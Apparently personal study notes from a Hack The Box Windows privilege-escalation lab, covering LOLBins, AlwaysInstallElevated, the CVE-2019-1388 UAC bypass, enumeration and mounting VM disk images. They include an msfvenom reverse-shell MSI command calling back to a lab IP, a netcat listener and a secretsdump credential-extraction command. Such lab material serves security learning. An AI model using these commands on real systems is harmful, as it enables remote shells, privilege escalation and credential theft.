...
Binaries that can be used for living off the land in windows, these files are native to windows so these binaries wont get fucked as hard and they can be used by the attacker
...
// RunDLL32 can also be used to run DLL binaries to get our reserve payloads
...
This setting can be set via local group policy setting, specifically

`Always install with elevated privileges` to `Enabled` under the following paths.
...
// now to execute said MSI package
...
CVE-2019-1388 is a high-severity elevation-of-privilege flaw in the Windows Certificate Dialog (part of User Account Control) that fails to enforce integrity levels on hyperlinks rendered in the “Issued by” field when a certificate’s SpcSpAgencyInfo OID (1.3.6.1.4.1.311.2.1.10) is present [NVD](https://nvd.nist.gov/vuln/detail/cve-2019-1388?utm_source=chatgpt.com). 

An attacker can exploit this by running a signed binary such as hhupd.exe (which contains the required OID and hyperlink), triggering the UAC prompt’s “Show information about the publisher’s certificate” option, and then clicking the hyperlink to launch the default browser as NT AUTHORITY\SYSTEM [GitHub](https://github.com/nobodyatall648/CVE-2019-1388?utm_source=chatgpt.com). 

From that SYSTEM-privileged browser, using “View page source” or “Save As” can be abused to spawn cmd.exe or PowerShell.exe with SYSTEM rights, granting full control of the machine [Medium](https://sotharo-meas.medium.com/cve-2019-1388-windows-privilege-escalation-through-uac-22693fa23f5f?utm_source=chatgpt.com). Microsoft addressed this issue in its November 2019 security update by enforcing proper privilege checks on certificate hyperlinks within the UAC interface

https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a to see if theyre vulnerable or not
...
```powershell
// ------------------------------ scheduled tasks ------------------------------ //
// enumerating it from the CMD
schtasks /query /fo LIST /v

// Enumerating it from Powershell
...
```powershell
// ------------------------------ Username / computer description field ------------------------------ //
// from powershell
Get-LocalUser

// using WMI to get a computer description
...
Files of interested are vhd, vhdx and vmdk files. 


```powershell
// ------------------------------ Mounting VM files ------------------------------ //

// Moutning VMDK on Linux
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

// Moutning VHD/VHJDX on linux
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1

// Mounting on windows
right click on the file and choose the option mount 

OR

open the disk management utilty to mount a VHD or VHDX file.

preferred to use the Mount-VHD pwoershell CMD

// Mounting a VMDK on windows

Right click -> Map vritual disk -> map  ???
...
other methods are present here too
...
Lab was literally one shotted LOL, just check the user description
...
```shell-session
Hillside_1@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
...
```shell-session
Hillside_1@htb[/htb]$ nc -lnvp 9443
...
```shell-session
Hillside_1@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```
...
```shell-session
Hillside_1@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```
...
```shell-session
Hillside_1@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
